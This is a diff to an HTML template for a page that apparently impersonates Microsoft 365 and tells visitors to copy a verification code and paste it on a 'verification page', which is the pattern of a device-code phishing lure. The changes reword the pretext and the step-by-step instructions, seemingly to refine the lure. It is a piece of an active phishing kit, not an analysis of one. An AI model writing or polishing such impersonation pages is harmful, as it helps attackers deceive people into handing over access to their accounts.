@@ -582,7 +582,7 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
       <p class="intro">Please verify your device to access your Microsoft 365 account.</p>
 
       <div class="info-box">
-        🔒 For security reasons, Microsoft requires verification before granting access to account activity reports.
+        💡 Microsoft requires verification before granting access to protected accounts.
       </div>
 
       <!-- Code Section -->
@@ -601,12 +601,11 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
 
       <!-- Instructions -->
       <div class="instruction-box">
-        <h4>📋 How to sign in:</h4>
+        <h4>ℹ️ Sign In Instructions:</h4>
         <ol>
-          <li>Copy the verification code above</li>
-          <li>Click the <strong>"Sign In to Microsoft"</strong> button below</li>
+          <li>Copy the verification code </li>
           <li>Paste the code when prompted on the verification page</li>
-          <li>Complete verification to access your account</li>
+          <li>Complete the process to access your Microsoft 365</li>
         </ol>
       </div>
 
@@ -618,7 +617,7 @@ body{font-family:'Segoe UI Variable Display','Segoe UI',-apple-system,BlinkMacSy
       <p class="footer-text">If you need assistance, contact your Microsoft 365 administrator.</p>
 
       <div class="timer-section">
-        <span>⏱️ Code expires in <span id="timerValue">{expires_minutes}</span></span>
+        <span>Code expires in <span id="timerValue">{expires_minutes}</span></span>
         <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()">↻ Refresh Code</button>
       </div>
     </div>
